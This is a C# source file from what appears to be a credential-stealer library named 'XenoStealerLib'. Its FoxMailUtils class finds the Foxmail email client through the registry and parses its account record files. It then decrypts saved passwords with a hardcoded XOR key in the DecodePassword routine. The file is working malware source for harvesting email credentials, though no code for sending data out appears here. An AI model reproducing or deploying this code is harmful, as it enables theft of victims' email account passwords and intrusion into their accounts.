using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    class FoxMailUtils
    {

        private static bool IsMatch(byte[] file, int start, byte[] pattern)
        {
            for (int i = 0; i < pattern.Length; i++)
            {
                if (file[start + i] != pattern[i])
                    return false;
            }
            return true;
        }
        private static byte[] SubArray(byte[] data, int index, int length)
        {
            byte[] result = new byte[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }
        private static bool isAscii(int x) 
        {
            return 32 <= x && x <= 127;
        }

        private static string StringReverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        private static byte[] HexToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                throw new Exception("The binary key cannot have an odd number of digits");

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        private static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }

        private static byte[] ExtendArrayByX(byte[] array, int x) 
        {
            byte[] newArray = new byte[array.Length * x];
            for (int i = 0; i < x; i++) 
            {
                Array.Copy(array, 0, newArray, array.Length * i, array.Length);
            }
            return newArray;
        }

        public static Dictionary<string, List<string>> parseRecFileStrings(byte[] fileBytes) 
        {
            int IdentifierLength = sizeof(int);
            int stringIdentifierEnum = 256;
            int unicodeStringIdentifierEnum = 8;
            byte[] stringIdentifier = BitConverter.GetBytes(stringIdentifierEnum);//new byte[] { 0x00, 0x01, 0x00, 0x00 };
            byte[] unicodeStringIdentifier = BitConverter.GetBytes(unicodeStringIdentifierEnum);//new byte[] { 0x08, 0x00, 0x00, 0x00 };

            fileBytes = SubArray(fileBytes, 4, fileBytes.Length - 4);//skip header


            Dictionary<string, List<string>> strings = new Dictionary<string, List<string>>();

            for (int x = 0; x <= fileBytes.Length-IdentifierLength; x++) 
            {
                bool MatchedUni = false;
                bool MatchedStr = false;
                if (IsMatch(fileBytes, x, stringIdentifier))
                {
                    MatchedStr = true;

                }
                else if (IsMatch(fileBytes, x, unicodeStringIdentifier)) 
                {
                    MatchedUni = true;
                }


                if (MatchedUni || MatchedStr) 
                {
                    string key_buff = "";
                    string value_buff = "";
                    bool worked = false;
                    for (int i = x - 1; i > 0; i--)
                    {
                        try
                        {
                            if (isAscii(fileBytes[i]))
                            {
                                key_buff += (char)fileBytes[i];
                            }
                            else
                            {

                                int key_len = BitConverter.ToInt32(fileBytes, i - 3);
                                if (key_len != 0 && key_len == key_buff.Length)
                                {
                                    key_buff = StringReverse(key_buff);
                                    worked = true;
                                }
                                break;
                            }
                        }
                        catch
                        {
                            worked = false;
                            break;
                        }
                    }
                    if (worked)
                    {
                        try
                        {
                            if (MatchedStr)
                            {
                                int string_len = BitConverter.ToInt32(fileBytes, x + 4);
                                value_buff = Encoding.UTF8.GetString(fileBytes, x + 8, string_len);

                            }
                            else if (MatchedUni)
                            {
                                int string_len = BitConverter.ToInt32(fileBytes, x + 4)*2;
                                value_buff = Encoding.Unicode.GetString(fileBytes, x + 8, string_len);
                            }
                            else 
                            {
                                worked = false;
                            }

                        }
                        catch
                        {
                            worked = false;
                        }
                    }

                    if (worked)
                    {
                        if (!strings.ContainsKey(key_buff))
                        {
                            strings[key_buff] = new List<string>();
                        }
                        strings[key_buff].Add(value_buff);
                    }
                }

            }

            return strings;
        }

        public static string DecodePassword(string password_hex) 
        {
            try
            {
                string result = "";
                byte firstByteDifference = 113;
                byte[] key = new byte[] { 126, 70, 64, 55, 37, 109, 36, 126 };
                byte[] password_bytes = HexToByteArray(password_hex);
                key = ExtendArrayByX(key, (int)Math.Ceiling((float)password_bytes.Length / (float)key.Length));
                password_bytes[0] ^= firstByteDifference;
                byte[] password_buffer = new byte[password_bytes.Length];
                for (int i = 1; i <= password_buffer.Length - 1; i++)
                {
                    password_buffer[i - 1] = (byte)(password_bytes[i] ^ key[i - 1]);
                }
                for (int i = 0; i < password_buffer.Length - 1; i++)
                {
                    int passwordChar = password_buffer[i] - password_bytes[i];
                    if (passwordChar < 0)
                    {
                        passwordChar += byte.MaxValue;
                    }
                    result += (char)passwordChar;
                }
                return result;
            }
            catch 
            {
                return null;
            }
        }

        public static string GetFoxMailLocation() 
        {
            string FoxMailRegPath = @"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
            string result = "";
            RegistryView registryView = Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32;
            RegistryKey local_machine = null;
            RegistryKey current_user = null;
            RegistryKey foxMailKey = null;
            try
            {
                local_machine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, registryView);
                foxMailKey = local_machine.OpenSubKey(FoxMailRegPath);
                string unformated_path = foxMailKey.GetValue("").ToString();
                int last_quote_index = unformated_path.LastIndexOf("\"");
                if (last_quote_index > 0) 
                {
                    string path_with_file=unformated_path.Substring(1, last_quote_index - 1);
                    result=Path.GetDirectoryName(path_with_file);
                }
            }
            catch 
            {
                
            }
            local_machine?.Dispose();
            foxMailKey?.Dispose();
            if (result != "") 
            {
                return result;
            }
            try
            {
                current_user = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, registryView);
                foxMailKey = current_user.OpenSubKey(FoxMailRegPath);
                string unformated_path = foxMailKey.GetValue("").ToString();
                int last_quote_index = unformated_path.LastIndexOf("\"");
                if (last_quote_index > 0)
                {
                    string path_with_file = unformated_path.Substring(1, last_quote_index - 1);
                    result = Path.GetDirectoryName(path_with_file);
                }
            }
            catch
            {

            }
            current_user?.Dispose();
            foxMailKey?.Dispose();
            if (result != "")
            {
                return result;
            }

            return null;
        }


    }
}
